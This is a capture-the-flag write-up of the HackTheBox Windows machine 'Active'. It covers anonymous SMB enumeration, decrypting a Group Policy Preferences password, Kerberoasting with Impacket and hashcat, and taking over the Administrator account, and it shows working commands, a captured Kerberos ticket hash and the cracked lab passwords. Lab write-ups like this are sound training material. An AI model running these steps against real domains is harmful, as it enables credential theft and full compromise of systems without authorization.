---
title: HTB · Active
slug: htb-active
date: 2026-08-13
image: active
platform: HackTheBox
os: Windows
difficulty: Easy
points: 450
tags: [hackthebox, windows, easy, retired, active-directory, smbclient, hashcat, smbmap, gpp-decrypt, kerberoast, getuserspns]
description: Active is a Windows Active Directory machine where initial access is gained by extracting a GPP-encrypted password from an anonymously readable SMB share.
featured: true
---

# Reconnaissance

## Staged Nmap Scanning
````bash
nmap -p- --min-rate 10000 10.129.63.147
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3269,3268,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49169 10.129.63.147
````
### Initial Scan Results
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
49169/tcp open  unknown
```
## Hosts File
```bash
echo "10.129.63.147 active.htb" | sudo tee -a /etc/hosts
```
## SMB - TCP 445
```bash
smbclient -N -L //active.htb

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      

```
The share `Replication` allows anonymous read access.
```bash
smbclient -N //active.htb/Replication
```
There is a directory in there called `active.htb` and there are 3 other directories `DfsrPrivate, Policies, scripts`
After looking around i found an interesting xml file with an encrypted password of user `SVC_TGS` in this path `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>`
And i downloaded it to my system for further investigation:
```bash
get Groups.xml
```
# Group Policy Preference
This is the password i need to decrypt: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network. An example use case is where a company’s gold image had a weak local administrator password, and administrators wanted to retrospectively set it to something stronger. The defined password was `AES-256` encrypted and stored in Groups.xml . However, at some point in 2012, Microsoft [published the AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be) on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low-hanging fruit.
## GPP Decryption
Kali has a built-in tool called `gpp-decrypt` that will decrypt the password:
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
> GPPstillStandingStrong2k18

Since i have a username and password now, I can access 3 more shares:
```bash
smbmap -H 10.129.63.147 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

Disk            Permissions          Comment
----            -----------          -------
ADMIN$          NO ACCESS            Remote Admin
C$              NO ACCESS            Default share
IPC$            NO ACCESS            Remote IPC
NETLOGON        READ ONLY            Logon server share 
Replication     READ ONLY
SYSVOL          READ ONLY            Logon server share 
Users           READ ONLY
```
Lets connect to `Users` share.
```bash
smbclient //active.htb/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```
We have enough access now to get the user.txt.
```powershell
smb: \SVC_TGS\Desktop\> get user.txt
```
# Privilege Escalation
I’ll use the `GetUserSPNs.py` script from Impacket to get a list of service usernames which are associated with normal user accounts. It will also get a ticket that I can crack.
This module will try to find Service Principal Names that are associated with normal user account. Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request will encrypt the ticket with the account the SPN is running under, this could be used for an offline bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.

The script identified a user, Administrator:
```bash
python3 GetUserSPNs.py -request -dc-ip 10.129.63.147 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```
And It also gives me the ticket, which I can try to brute force decrypt to get the administrator's password:
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1fc08a7003cdc6fe53262273004ad78b$e48e5367e75b076e4adc95c51d46f9e8e64c304b44a2ee479cabe8293de33431423e92d5079d83e6b5257e6f6b9142f6d27638a09f3746ae4a0d36bd0aa25599fbf23de13a7133a7be94bae2f712f027d181dd333095be45d8763a4e19d97baee8e64120bc68b97f4a7d4f2c5ccf67803668addc007c135e9dea603bfb46d8dea498d5c1fb530359c9175de0a40f13ced91cbbef53c963261ccf00cc07fe2504007a6e1fa2d214fd79b39610c8bf83660c592299fa03079eabb562241fae1b2eae8b70ce02d7bddd08516e61e914918686704220e4b77467db86687ce6dbfb4c6bd5affb14b79a116e288fe98376caaed6fc7b8812239de1fc1ff80aa70e45e72de2abb269a4f7f243b8fc9c0120e62b46d246a427e43bdb01d63693f41cd34bfcbf9841e0d28dd7629f33a9eb142cc9bf86858881c814511146a78e0b32e65ff2afebaa8f4945dc85fd753ec5c93a0c66a43e07f11444ccbed3efbf94ffcda9a3352144f8d5b638fd11ff39f73bbf5f947dabd7d54dca4a6c63b24ee2d9614e3654f393614628746449df77bfc39095b3ff56402f035fc77b42dadad83b377712cd2744980919f54b31fcb78075e216ef51a23f39a3b42c439da15ec4111991a08a7b1c005717ce6923fcbfee2843e66246fdae42b65555a4ed6e3dae466097c7c500b8c3116941989f68a86c1d2b83ae0785d47858c7b764f95586b705bc6aed04ed73c6b3b33e5610e5fcfaadb6aea4f7cb281df344802e097438b24c89c1567734beaff8cdbbe4f3d5c2e1cde5bc05e584a0c977fe0452defe08eea0efc3a1fa78826c4e05fecc4e07d20f2cc720d5f2129b567fd0ccccfa06b859932daebfed8ad02d3ed032f3058c0e368116823029f7bdf6e6683db928295bffda1d19535b8587cb0bd814ea93b77a46838fea905c1ec5081da52b141688f657f4951b4eeb31365071a1cfe6f0bac1d468ef8640a2c4c17ba1bc7166e5fce9187ffb9c034de3a567cc7480b0f77d7743523e07e8318720b58f7889bcd502d0fa613b3d47e6b8181dba3cb3b02140fd6beef9afbfb529a679a757cc6f3c0e07d38935bf0ebbf5d013ef805718f1f0343727a14656efcff143dc4fa39b41e47d3cbdcfad32a20d54039d160efa5a3fe42c8bb15461b315b334350d9bfb8b09d3f5a4da0b3713be989e2307d0156964ffcdfe354cdf184e05cb6b95c6a9540c46b8ec36691c1d291e9da2c77259b01182b6ac4668dad2a9383a5d90b39b09
```
## Decrypting with Hashcat
```bash
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```
> Ticketmaster1968

Now with the administrator's password i have access to almost all shares, including C$, which gives me the entire file system.
```bash
smbmap -H active.htb -d active.htb -u administrator -p Ticketmaster1968

IP: 10.129.63.147:445      Name: active.htb                Status: ADMIN!!! 
Disk            Permissions          Comment
----            -----------          -------
ADMIN$          READ, WRITE          Remote Admin
C$              READ, WRITE          Default share
IPC$            NO ACCESS            Remote IPC
NETLOGON        READ, WRITE          Logon server share 
Replication     READ ONLY
SYSVOL          READ, WRITE          Logon server share 
Users           READ ONLY
```
So now let's just connect to C$ and grab our root.txt flag.
```bash
smbclient //active.htb/C$ -U active.htb\\administrator%Ticketmaster1968
```
`smb: \Users\Administrator\Desktop\> get root.txt`
